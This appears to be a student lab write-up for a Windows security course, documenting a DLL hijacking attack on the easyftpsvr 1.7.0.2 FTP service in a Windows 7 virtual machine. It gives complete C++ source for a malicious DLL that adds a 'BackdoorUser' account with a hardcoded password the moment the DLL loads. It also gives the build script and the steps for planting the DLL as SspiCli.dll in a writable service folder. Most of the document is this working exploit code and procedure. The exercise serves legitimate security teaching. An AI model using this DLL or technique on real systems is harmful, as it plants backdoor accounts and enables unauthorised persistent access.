# Windows Security I

## DLL-Hijack 

### Setup of Target and Development Systems

>The target system (easyftpsvr-1.7.0.2) is vulnerable to DLL hijacking attacks. A prototype on your own VM is sufficient (no VPN needed).
>- Find a DLL that is in a writable location.
>- Analyze the provided program (ftpbasicsvr.exe) with Sysinternals procmon, identify a DLL and create the malicious DLL.
>- Create a DLL to add a backdoor user for the provided easyftp server.
>- You can either create the DLL with Visual Studio Code and build the solution or you can use "shell2bin" or "dll proxy" tools.

A Windows-7 (32 bit) virtual machine was created in VirtualBox to execute the `easyftpsvr-1.7.0.2` in. The .iso file was taken from
https://dn710009.ca.archive.org/0/items/Win7UltimateSP1DEU/6.1.7601.17514-de-Windows_7_x86fre_client_de-de_OEM_Ultimate-GSP1RMCULFREO_DE_DVD.iso

The sysinternals binary was taken from  
https://download.heise.de/files/91u2lXHegN-ElbAyvtlAsA/320580/sysinternalssuite.zip?expires=1759311998

In order to get the sysinternals `procmon` to work on the Windows 7 VM, an additional Windows 7 Software Update had to be installed:  
https://catalog.s.download.windowsupdate.com/d/msdownload/update/software/secu/2015/02/windows6.1-kb3033929-x86_927e018113fe51250c57029635d46b89bf235920.msu

The DLL containing the payload was implemented on a native Windows 11 OS. For the compilation, the Visual Studio Build tools were installed (Variant "Desktop Development with C++")
https://download.visualstudio.microsoft.com/download/pr/e28bf043-c63e-47d0-b6e9-c418229fb008/999a275192383f1da35ccf655568645534b632770c556f64f866f3d3f7b53b32/vs_BuildTools.exe

### Development of the DLL, including Payload

A C++ module containing the `DllMain()` function was implemented. The payload code was executed if `ul_reason_for_call == DLL_PROCESS_ATTACH`, i.e. in the moment in which a process is loading the DLL. Even if a subsequent function lookup of the process is failing, the payload code has already been executed.

```C++
bool userExists(LPWSTR username)
{
    LPUSER_INFO_0 pUserInfo = nullptr;
    NET_API_STATUS status = NetUserGetInfo(nullptr, username, 0, (LPBYTE*)&pUserInfo);

    if (status == NERR_Success)
    {
        NetApiBufferFree(pUserInfo);
        return true;
    } 
    else if (status == NERR_UserNotFound)
    {
        return false;
    } 
    else
    {
        std::cerr << "Error checking user: " << status << std::endl;
        return false;
    }
}

void createUser(LPWSTR pUserName, LPWSTR passwd)
{
    // Set up user info
    USER_INFO_1 ui;
    ui.usri1_name = pUserName;
    ui.usri1_password = passwd;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = nullptr;
    ui.usri1_comment = nullptr;
    ui.usri1_flags = UF_SCRIPT;
    ui.usri1_script_path = nullptr;

    DWORD dwError = 0;
    NET_API_STATUS nStatus = NetUserAdd(nullptr, 1, (LPBYTE)&ui, &dwError);

    if (nStatus == NERR_Success)
    {
        wprintf(L"User created successfully.\n");
    }
    else
    {
        wprintf(L"Failed to create user. Error: %d\n", nStatus);
    }
}


BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD  ul_reason_for_call,
                      LPVOID lpReserved)
{
    if (DLL_PROCESS_ATTACH == ul_reason_for_call)
    {
        // Called when the DLL is loaded into a process
        std::cout << "The DLL just got loaded.\n";
        std::string userAndDomain = "";
        if (getUserDomainString(userAndDomain) == 0)
        {
            std::cout << "User and domain: " << userAndDomain << "\n";
            writeInfo(userAndDomain);

            // The actual payload comes here
            if (!userExists(L"BackdoorUser"))
            {
                createUser(L"BackdoorUser", L"BackdoorPasswd");
            }
        }
        else
        {
            std::cerr << "Error: could not get user and domain.\n";
        }            
    }

    return TRUE;
}
```

The "Developer Command Prompt for VS 2022" (installed via Visual Studio Build Tools) is started to run the compilation commands in. As the targeted Windows 7 is a 32 bit OS, it must be ensured that the toolchain generates 32-bit binaries. This is done using the command line

```bat
call "C:\Path\To\VC\Auxiliary\Build\vcvarsall.bat" x86
```

The DLL, and a tiny test.exe are built using the following batch file, which compiles DLL and test app in debug mode and links the runtime statically, which avoids the hassle of having to copy additional DLLs onto the target system:

```bat
@ECHO OFF

REM
REM _MBCS -> use multi-byte charsets, WIN32->32 bit platform, _WINDOWS -> Windows build
REM
SET DEFINES=/D _MBCS /D WIN32 /D _WINDOWS

REM
REM Adapt library path to wherever the libraries reside
REM
SET LIBPATH=/LIBPATH:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.26100.0\um\x86"
SET LIBRARIES=kernel32.Lib USER32.LIB GDI32.LIB WINSPOOL.LIB SHELL32.LIB OLE32.LIB OLEAUT32.LIB UUID.LIB COMDLG32.LIB ADVAPI32.LIB

REM
REM 0d-> no optimization and debugging info, EHsc add exception support
REM Zc:wchar_t->use wchar_t as builtin type, Gd -> cdecl calling convention, GR -> enable RTTI
REM
SET CCOPTS=/Od /EHsc /MTd /Zc:wchar_t /Gd /GR

cl /LD /nologo %DEFINES% /D _WINDLL %CCOPTS% src/mylib.cpp     /link %LIBPATH% %LIBRARIES% /out:mylib.dll
cl     /nologo %DEFINES%            %CCOPTS% src/mylibtest.cpp /link %LIBPATH% %LIBRARIES% /out:mylibtest.exe
```

After compilation and testing on the development system, the DLL is copied into the target system, together with the FTPServer sources and the sysinternal binaries. The `easyftpsvr` binary is added into `C:\CCD\easyftpsvr-1.7.0.2`, a folder that can be accessed by any user. The service is installed with admin rights by invoking `easyftpsvr.exe -install`, and now shows up in the lists of services executing in the VM:

![Services](Services.png)

In the next step, `procmon` is started, and a filter is added which excludes all non-ftp services like shown below:

![ProcMonFilter](ProcMonFilter.png)

If there is no entry in the resulting list, stopping and restarting the service will populate it. Double-clicking one of the events, then switching to the "Process" tab provides the list of DLLs which the `easyftpsvr` service has currently loaded. 

![ProcMonDLLList](ProcMonDLLList.png)

As `sspicli.dll` has been successfully used for DLL sideloading in the past, https://hijacklibs.net/entries/microsoft/built-in/sspicli.html, `mylib.dll` is copied into `C:\CCD\easyftpsvr-1.7.0.2` as `SspiCli.dll`. After stopping and restarting the server, `net user` displays the `BackDoorUser` which was installed when the DLL was loaded.

![BackDoorUser](BackDoorUser.png)
